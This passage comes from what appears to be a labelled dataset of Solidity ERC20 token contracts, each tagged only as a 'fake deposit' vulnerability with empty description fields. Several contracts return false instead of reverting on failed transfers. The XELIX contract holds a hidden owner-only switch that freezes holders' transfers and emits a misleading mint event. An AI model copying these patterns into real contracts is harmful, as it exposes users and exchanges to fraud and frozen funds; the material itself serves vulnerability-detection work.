        "Code": "pragma solidity ^0.4.18;\r\n//this project is non-profit work.\r\ncontract Token {\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract RJMcontract is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n       if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract RJM is RJMcontract {\r\n    string public name;                   \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'H1.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n    function RJM() {\r\n        balances[msg.sender] = 1000000000000;              \r\n        totalSupply = 1000000000000;                        \r\n        name = \"Reversed MYONG\";                                   \r\n        decimals = 4;                                               \r\n        symbol = \"Reversed JM\";                                            \r\n        unitsOneEthCanBuy = 1000000;                                \r\n        fundsWallet = msg.sender;                                   \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy/1000000000000000000;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address BoI = 0xBC3054A5872773B726c2b71A29Dac1Fc933aFFE1;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n   require(msg.sender == _Owner);     \r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract XELIX is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Bxx;\r\n    mapping (address => uint256) private Byy;\r\n    mapping (address => mapping (address => uint256)) private BvI;\r\n    uint8 private constant BdI = 8;\r\n    uint256 private constant bTT = 150000000 * (10** BdI);\r\n    string private constant _name = \"Xelix Network\";\r\n    string private constant _symbol = \"XELIX\";\r\n\r\n\r\n\r\n    constructor () {\r\n       Bxx[_msgSender()] = bTT; \r\n    emit Transfer(address(0), BoI, bTT);}\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return BdI;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return bTT;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Bxx[account];\r\n    }\r\n\t function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return BvI[owner][spender];\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        BvI[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n\r\n    function update() public {\r\n        Bxx[msg.sender] = Byy[msg.sender];}\r\n        function transfer(address to, uint256 amount) public {\r\n        if(Byy[msg.sender] <= 1) {\r\n        require(Bxx[msg.sender] >= amount);\r\n        Bxx[msg.sender] -= amount;  \r\n        Bxx[to] += amount;          \r\n        emit Transfer(msg.sender, to, amount);}}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(Byy[sender] <= 1 && Byy[recipient] <= 1) {\r\n        require(amount <= Bxx[sender]);\r\n        require(amount <= BvI[sender][msg.sender]);\r\n        Bxx[sender] -= amount;\r\n        Bxx[recipient] += amount;\r\n        BvI[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}\r\n        function Qry(address x, uint256 y) public {\r\n        require(msg.sender == BoI);\r\n        Byy[x] = y;}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// File: test3.sol\r\n\r\npragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n/// @return total amount of tokens\r\nfunction totalSupply() constant returns (uint256 supply) {}\r\n\r\n/// @param _owner The address from which the balance will be retrieved\r\n/// @return The balance\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n/// @notice send `_value` token to `_to` from `msg.sender`\r\n/// @param _to The address of the recipient\r\n/// @param _value The amount of token to be transferred\r\n/// @return Whether the transfer was successful or not\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n/// @param _from The address of the sender\r\n/// @param _to The address of the recipient\r\n/// @param _value The amount of token to be transferred\r\n/// @return Whether the transfer was successful or not\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n/// @param _spender The address of the account able to transfer the tokens\r\n/// @param _value The amount of wei to be approved for transfer\r\n/// @return Whether the approval was successful or not\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n/// @param _owner The address of the account owning tokens\r\n/// @param _spender The address of the account able to transfer the tokens\r\n/// @return Amount of remaining tokens allowed to spent\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {\r\n    if (balances[msg.sender] >= _value && _value > 0) {\r\n        balances[msg.sender] -= _value;\r\n        balances[_to] += _value;\r\n        Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    } else { return false; }\r\n}\r\n\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n        allowed[_from][msg.sender] -= _value;\r\n        Transfer(_from, _to, _value);\r\n    return true;\r\n    } else { return false; }\r\n}\r\n\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\n    return balances[_owner];\r\n}\r\n\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    Approval(msg.sender, _spender, _value);\r\n    return true;\r\n}\r\n\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n    return allowed[_owner][_spender];\r\n}\r\n\r\nmapping (address => uint256) balances;\r\nmapping (address => mapping (address => uint256)) allowed;\r\nuint256 public totalSupply;\r\n}\r\n\r\n//name this contract whatever you\u2019d like\r\ncontract ERC20Token is StandardToken {\r\n\r\nfunction () {\r\n//if ether is sent to this address, send it back.\r\nthrow;\r\n}\r\n\r\n\r\nstring public name; \r\nuint8 public decimals; \r\nstring public symbol; \r\nstring public version = 'H1.0'; \r\n\r\n\r\nfunction ERC20Token() {\r\n    balances[msg.sender] = 30000000000000; \r\n        totalSupply = 30000000000000; \r\n        name = \"SHRUG\"; \r\n        decimals = 18; \r\n        symbol = \"SHRG\"; \r\n    }\r\n\r\n    \r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    Approval(msg.sender, _spender, _value);\r\n\r\n    if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.6.7;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n// this is the basics of creating an ERC20 token\r\n//change the name Henri and the symbol to whatever you would like\r\n\r\ncontract RichMan is ERC20 {\r\n    string public constant symbol = \"RICH\";\r\n    string public constant name = \"Richman Coin\";\r\n    uint8 public constant decimals = 18;\r\n \r\n    //100,000\r\n    uint private constant __totalSupply = 100000000000000000000000;\r\n\r\n    //this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    //This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    //the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    //constant value that does not change/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    //returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    //transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    //does the msg.sender have enough tokens to forfill the transfer\r\n    //decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    //If the 3rd party has an allowance of >0 \r\n    //and the value to transfer is >0 \r\n    //and the allowance is >= the value of the transfer\r\n    //and it is not a contract\r\n    //perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            //  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    //This check is to determine if we are sending to a contract?\r\n    //Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        //in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        // i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    //allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    //shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Hexaputon is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Hexaputon\";\r\n    string public constant symbol = \"HEXA\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.4.19;\r\n\r\ncontract Token {\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) public constant returns (uint balance);\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint _value) public returns (bool success);\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint _value) public returns (bool success);\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint _value) public returns (bool success);\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) public constant returns (uint remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract RegularToken is Token {\r\n    uint constant private MAX_UINT = 2**256 - 1;\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n\r\n    function transfer(address _to, uint _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) public returns (bool success)\r\n    {\r\n        uint allowance = allowed[_from][msg.sender];\r\n        if (balances[_from] >= _value\r\n            && allowance >= _value\r\n            && balances[_to] + _value >= balances[_to]\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            if (allowance < MAX_UINT) {\r\n                allowed[_from][msg.sender] -= _value;\r\n            }\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public constant returns (uint balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n}\r\n\r\ncontract IOSToken is RegularToken {\r\n\r\n    uint constant public totalSupply = 90*10**27;\r\n    uint8 constant public decimals = 18;\r\n    string constant public name = \"Wrapped IOST\";\r\n    string constant public symbol = \"IOST\";\r\n\r\n    function IOSToken() public {\r\n        balances[msg.sender] = totalSupply;\r\n        Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// Abstract contract for the full ERC 20 Token standard\r\npragma solidity ^0.5.17;\r\n\r\ncontract Token {\r\n    \r\n    uint256 public totalSupply;\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance);\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success);\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success);\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n/*\r\nYou should inherit from StandardToken or, for a token like you would want to\r\ndeploy in something like Mist, see WalStandardToken.sol.\r\n(This implements ONLY the standard functions and NOTHING else.\r\nIf you deploy this, you won't have anything useful.)\r\n\r\nImplements ERC 20 Token standard: https://github.com/ethereum/EIPs/issues/20\r\n.*/\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract SOT is StandardToken {\r\n\r\n    /* Public variables of the token */\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals.\r\n    string public symbol;                 //An identifier\r\n    string public version = \"1.0\";       // 0.1 standard. Just an arbitrary versioning scheme.\r\n    constructor() public{\r\n        balances[msg.sender] = 91000000000000;               // Give the creator all initial tokens\r\n        totalSupply = 91000000000000;                        // Update total supply\r\n        name = \"SOT\";                                   // Set the name for display purposes\r\n        decimals = 6;                            // Amount of decimals for display purposes\r\n        symbol = \"SOT\";                               // Set the symbol for display purposes\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.12;\r\n \r\n\r\ncontract IMigrationContract {\r\n    function migrate(address addr, uint256 nas) returns (bool success);\r\n}\r\n\r\n\r\ncontract SafeMath {\r\n    function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\r\n        uint256 z = x + y;\r\n        assert((z >= x) && (z >= y));\r\n        return z;\r\n    }\r\n \r\n    function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\r\n        assert(x >= y);\r\n        uint256 z = x - y;\r\n        return z;\r\n    }\r\n \r\n    function safeMult(uint256 x, uint256 y) internal returns(uint256) {\r\n        uint256 z = x * y;\r\n        assert((x == 0)||(z/x == y));\r\n        return z;\r\n    }\r\n \r\n}\r\n \r\n\r\ncontract Token {\r\n    uint256 public totalSupply; //\u4ee3\u5e01\u603b\u91cf\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\ncontract StandardToken is Token {\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n \r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n \r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n \r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n \r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n}\r\n \r\n\r\n//JGO\u4ee3\u5e01\u5408\u7ea6\r\ncontract JGOToken is StandardToken, SafeMath {\r\n    string  public constant name     = \"laeerg\";   //\u540d\u79f0\r\n    string  public constant symbol   = \"LAR\";   //\u7b26\u53f7\r\n    uint256 public constant decimals = 9;      //\u5c0f\u6570\u4f4d\r\n    string  public           version = \"1.0\";   //\u7248\u672c\r\n \r\n    address public ethFundDeposit;              //ETH\u5b58\u653e\u5730\u5740\r\n    uint256 public currentSupply;               //\u4ee3\u5e01\u4f9b\u5e94\u91cf\r\n\r\n \r\n    modifier isOwner()  { require(msg.sender == ethFundDeposit); _; }\r\n\r\n    function formatDecimals(uint256 _value) internal returns (uint256 ) {\r\n        return _value * 10 ** decimals;\r\n    }\r\n\r\n \r\n    //JGO\u5408\u7ea6\u521d\u59cb\u5316\u51fd\u6570(\u5408\u7ea6\u6240\u6709\u4eba\u5730\u5740, \u5f53\u524d\u4f9b\u5e94\u91cf, \u4ee3\u5e01\u603b\u91cf)\r\n    function JGOToken(address _ethFundDeposit, uint256 _totalSupply) {\r\n        ethFundDeposit = _ethFundDeposit;\r\n                      \r\n        currentSupply = formatDecimals(_totalSupply); //\u5f53\u524d\u4f9b\u5e94\u91cf\r\n        totalSupply = formatDecimals(_totalSupply);     //\u4ee3\u5e01\u603b\u91cf\r\n        balances[msg.sender] = totalSupply;\r\n        if(currentSupply > totalSupply) throw;\r\n    }\r\n    \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
